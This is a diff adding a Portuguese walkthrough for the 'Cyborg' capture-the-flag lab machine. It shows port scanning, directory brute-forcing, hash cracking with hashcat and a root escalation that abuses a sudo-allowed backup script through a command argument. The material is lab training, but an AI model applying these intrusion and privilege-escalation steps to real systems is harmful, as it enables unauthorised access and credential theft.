@@ -1,0 +1,85 @@
+**Português:**
+
+1. Execute uma varredura inicial Nmap para descobrir portas e serviços abertos:
+   ```
+   nmap -sCV --open -oN nmap cyborg.thm
+   ```
+
+   Saída:
+   ```
+   PORTA   ESTADO SERVIÇO VERSÃO
+   22/tcp aberto  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocolo 2.0)
+   80/tcp aberto  http    Apache httpd 2.4.18 ((Ubuntu))
+   |_http-server-header: Apache/2.4.18 (Ubuntu)
+   |_http-title: Página Padrão do Ubuntu Apache2: Funciona
+   Informações do Serviço: SO: Linux; CPE: cpe:/o:linux:linux_kernel
+   ```
+
+2. Use o GoBuster para procurar por diretórios no servidor web:
+   ```
+   gobuster dir -u http://cyborg.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 90
+   ```
+
+   Explicação:
+   - `dir`: Especifica o modo de diretório.
+   - `-u`: Especifica a URL.
+   - `-w`: Especifica o caminho para a lista de palavras (wordlist).
+   - `-t`: Define o número de threads para solicitações concorrentes. As threads são frequentemente usadas para gerenciar solicitações de clientes e executar código para processar essas solicitações.
+
+   Saída:
+   ```
+   [--> http://cyborg.thm/admin/]
+   [--> http://cyborg.thm/etc/]
+   ```
+
+3. Explore o diretório `/admin/` e encontre um arquivo "arquive.tar" para extrair.
+   - É um repositório de backup Borg. Consulte [https://borgbackup.readthedocs.io/](https://borgbackup.readthedocs.io/).
+
+4. Examine o conteúdo de `music_archive` e encontre uma nota com um nome de usuário e senha.
+   ```
+   cat home/alex/Documents/note.txt
+   ```
+
+   Saída:
+   ```
+   Caramba, sou péssimo para lembrar senhas, então segui o conselho do meu amigo e anotei!
+   " usuário:senha "
+   ```
+
+5. Investigue o diretório `/etc/` e encontre um arquivo chamado `passwd`.
+   - Procure por senhas criptografadas no arquivo.
+
+6. Analise o hash em `passwd` usando o `hashid` para identificar o tipo de hash.
+   ```
+   hashid "hash"
+   ```
+
+7. Se o hash for identificado como tipo 1600, use o `hashcat` para tentar quebrá-lo:
+   ```
+   hashcat -a 0 -m 1600 "hash" "caminho/para/lista/de/palavras"
+   ```
+
+8. Dentro da máquina, verifique as permissões do sudo para o usuário:
+   ```
+   sudo -l
+   ```
+
+   Saída:
+   ```
+   (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+   ```
+
+9. Identifique que o usuário tem permissão para executar um arquivo `.sh` com privilégios de root sem senha.
+   - Analise o script `backup.sh` que requer um argumento para concluir a execução do programa.
+
+10. Explore o script `backup.sh` para obter acesso como root.
+
+11. Para elevar os privilégios para root, vamos analisar o código.
+    Parece que o script está esperando por um argumento onde há um loop "WHILE".
+    Portanto, você pode usar o seguinte comando para executar um comando e obter a flag de root:
+  
+  ```
+  sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
+  ```
+  
+Esse comando irá recuperar a flag de root.
